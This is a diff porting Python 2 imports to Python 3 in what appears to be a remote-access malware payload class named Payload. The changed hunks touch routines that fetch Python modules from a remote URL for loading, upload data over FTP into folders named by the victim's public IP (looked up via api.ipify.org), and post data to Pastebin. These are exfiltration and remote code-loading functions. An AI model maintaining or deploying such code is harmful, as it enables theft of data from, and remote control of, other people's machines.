@@ -13,14 +13,19 @@ import ftplib
 import struct
 import socket
 import urllib
-import urllib2
 import logging
-import StringIO
 import functools
 import threading
 import subprocess
 import collections
 import logging.handlers
+if sys.version_info[0] < 3:
+    from urllib2 import urlopen, urlparse
+    import StringIO
+else:
+    from urllib import parse as urlparse
+    from urllib.request import urlopen
+    from io import StringIO
 
 # modules
 try:
@@ -146,9 +151,9 @@ class Payload():
             if not base_url.startswith('http'):
                 raise ValueError("keyword argument 'base_url' must start with http:// or https://")
             log('[*] Searching %s' % base_url)
-            path = urllib2.urlparse.urlsplit(base_url).path
+            path = urlparse.urlsplit(base_url).path
             base = path.strip('/').replace('/','.')
-            names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urllib2.urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
+            names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
             for n in names:
                 name, ext = os.path.splitext(n)
                 if ext in ('.py','.pyc'):
@@ -279,7 +284,7 @@ class Payload():
             else:
                 source = StringIO.StringIO(bytes(source))
             host = ftplib.FTP(host=host, user=user, password=password)
-            addr = urllib2.urlopen('http://api.ipify.org').read()
+            addr = urlopen('http://api.ipify.org').read()
             if 'tmp' not in host.nlst():
                 host.mkd('/tmp')
             if addr not in host.nlst('/tmp'):
@@ -841,8 +846,8 @@ class Payload():
             if api_key:
                 info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
                 paste = globals()['post']('https://pastebin.com/api/api_post.php',data=info)
-                parts = urllib2.urlparse.urlsplit(paste)
-                return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+                parts = urlparse.urlsplit(paste)
+                return urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
             else:
                 return "{} error: no pastebin API key".format(self.pastebin.func_name)
         except Exception as e:
